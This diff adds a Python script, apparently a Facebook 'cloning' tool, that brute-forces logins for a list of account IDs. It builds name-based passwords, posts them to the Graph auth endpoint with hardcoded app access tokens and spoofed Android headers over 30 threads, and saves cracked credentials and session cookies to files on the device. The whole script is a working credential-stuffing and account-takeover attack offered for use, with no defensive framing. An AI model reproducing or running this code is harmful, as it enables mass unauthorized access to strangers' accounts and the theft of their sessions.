@@ -1,0 +1,198 @@
+#Coded by HANNAN . Modified by AKASH SHARMA 
+import os,time,random,re,sys,string, subprocess
+from concurrent.futures import ThreadPoolExecutor as tpe
+
+try:
+ import time,json,uuid,requests
+except:
+ os.system("pip install requests")
+ 
+idss = []
+pp = []
+oku = []
+cpu = []
+l = []
+idx = []
+loop = +1
+
+def oo(t):
+  return '\033[1;37m['+str(t)+']\033[1;37m '
+  
+W = '\x1b[1;97m'
+G = '\x1b[1;92m'
+R = '\x1b[1;91m'
+S = '\x1b[1;96m'
+B = '\x1b[1;94m'
+Y = '\x1b[1;93m'
+P = '\x1b[1;95m'
+
+logo=(f"""\u001b[1;96m
+__      ___                       _  _                     
+ \ \    / (_)                     | || |                    
+  \ \  / / _ _ __ _   _ ___ ______| || |_ _   _  ___  _   _ 
+   \ \/ / | | '__| | | / __|______|__   _| | | |/ _ \| | | |
+    \  /  | | |  | |_| \__ \         | | | |_| | (_) | |_| |
+     \/   |_|_|   \__,_|___/         |_|  \__, |\___/ \__,_|
+                                           __/ |            
+                                          |___/             
+                                          
+[∅]= MODIFIED BY :- AKASH SHARMA 
+""")
+
+def clear():
+   os.system('clear')
+   print(logo);lin3()
+   
+def lin3():
+   print('\33[1;37m---------------------------------')
+def exit():
+  sys.exit()
+  
+def main_menu():
+    os.system("clear")
+    print(logo);lin3()
+    print(f"{oo(1)}File Cloning ")
+    print(f"{oo(0)}Exit")
+    lin3()
+    cp =input('[?] Choice : ')
+    if cp=="1":file()
+    if cp == "0":
+     exit()
+    main_menu()
+    
+def file():
+    os.system("clear")
+    print(logo);lin3()
+    file = input(f"{oo('-')}Enter File: ")
+    try:
+        for x in open(file,'r').readlines():
+            idx.append(x.strip())
+    except:
+        print(f"{oo('!')}File Not Found");time.sleep(1)
+        main_menu() 
+    method()
+    exit()
+
+
+
+"""
+------Access Token------
+Access Tokens. Change if necessary.
+
+Ads Manager Android : 438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28
+Facebook Android : 350685531728|62f8ce9f74b12f84c123cc23437a4a32
+Facebook iPhone : 6628568379|c1e620fa708a1d5696fb991c1bde5662
+Ads Manager App for iOS : 1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae
+
+--------URL and Host--------
+Graph : https://graph.facebook.com/auth/login/
+B-Graph : https://b-graph.facebook.com/auth/login
+"""
+
+def method():
+    clear()
+    
+    lp = input(f'{oo("?")}Limit Passwords? : ')
+    if lp.isnumeric():
+        pp=[]
+        clear()
+        ex = 'firstlast first123 last123'
+        print(f'{oo("+")}{ex} (ETC)')
+        lin3()
+        for x in range(int(lp)):
+           pp.append(input(f'{oo(x+1)}Password : '))
+    else:
+       print(f"{oo('!')}Numeric Only");time.sleep(0.8)
+       main_menu()
+    clear() 
+    print('\033[1;97m[+] ToTaL AcCouNts FoR CraCk : \033[1;32m '+str(len(idx)))
+    print(f'\x1b[1;97m[✓] DoNt UsE A!r0pLanE M0dE :) ')
+    lin3()
+    def start(user):
+     try:
+        global loop,idx,cll
+        r = requests.Session()
+        user = user.strip()
+        acc, name = user.split("|")
+        first = name.rsplit(" ")[0]
+        try:
+            last = name.rsplit(" ")[1]
+        except:
+            last = first
+        pers = str(int(loop)/int(len(idx)) * 100)[:4]
+        sys.stdout.write(f'\r {R}[{W}HANNAN{R}] {P}({Y}{loop}{W} / {W}{len(idx)}{P}) {W}• {G}{len(oku)}\r')
+        sys.stdout.flush()
+        loop+=1
+        for pswd in pp:
+              heads="Mozilla/5.0 (Linux; Android 9; Redmi Note 5 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.192 Mobile Safari/537.36 OPR/74.0.3922.70977"
+              pswd = pswd.replace(f'first',first.lower()).replace(f'First',first).replace(f'last',last.lower()).replace(f'Last',last).replace(f'Name',name).replace(f'name',name.lower())
+              header = {
+    'authority': 'mbasic.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
+    'cache-control': 'max-age=0',
+    # 'cookie': 'datr=OrTYZIYv_3SdpHJy0HfUWQjG; sb=9zndZPTDvZrwUkBhG9rZI7wz; vpd=v1%3B659x393x2.75; locale=en_US; dpr=2.75; wl_cbv=v2%3Bclient_version%3A2311%3Btimestamp%3A1692936551; wd=393x659; fr=04957AuiixhBBaTmZ.AWUcamWSkhl4LlXCxyCL7FCW7BQ.Bk2LQ6.2W.AAA.0.0.Bk6Cmo.AWXiXwqbvq4',
+    'dpr': '2.75',
+    'referer': 'https://in.search.yahoo.com/',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+    'sec-ch-ua-full-version-list': '"Chromium";v="107.0.5304.68", "Not=A?Brand";v="24.0.0.0"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"Redmi Note 5 Pro"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"9.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'cross-site',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
+    'viewport-width': '980',
+              }
+              
+              data={
+    "adid": str(uuid.uuid4()),
+    "format": "json",
+    "device_id": str(uuid.uuid4()),
+    "cpl": "true",
+    "family_device_id": str(uuid.uuid4()),
+    "credentials_type": "device_based_login_password",
+    "error_detail_type": "button_with_disabled",
+    "source": "device_based_login",
+    "email": acc,
+    "password": pswd,
+    "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
+    "generate_session_cookies": "1",
+    "meta_inf_fbmeta": "",
+    "advertiser_id": str(uuid.uuid4()),
+    "currently_logged_in_userid": "0",
+    "locale": "en_US",
+    "client_country_code": "US",
+    "method": "auth.login",
+    "fb_api_req_friendly_name": "authenticate",
+    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+    "api_key": "882a8490361da98702bf97a021ddc14d",
+              }
+              response = r.post('https://graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False).text
+              if "session_key" in response:
+                 oku.append(acc)
+                 cookie=f"sb={''.join(random.choices(string.ascii_letters+string.digits+'_',k=24))};" +";".join(f"{i['name']}={i['value']}" for i in json.loads(response)["session_cookies"])
+                 print('\033[1;32m[OK] \033[1;32m'+acc+' \033[1;32m|\033[1;32m '+pswd)
+                 print(" [Cookie] ",cookie)
+                 open('/sdcard/AKASH-Ok.txt','a').write(f'{acc}|{pswd}\n')
+                 break
+              elif "User must verify their account" in response:
+                cpu.append(acc)
+                print('\033[1;31m[CP] \033[1;31m'+acc+' \033[1;31m|\033[1;31m '+pswd)
+                open('/sdcard/AKASH-CP.txt','a').write(f'{acc}|{pswd}\n')
+                break
+              else:
+                   continue
+     except Exception as e:
+       time.sleep(10)
+    with tpe(max_workers=30) as tp:
+            tp.map(start,idx)
+    exit()    
+
+
+main_menu()
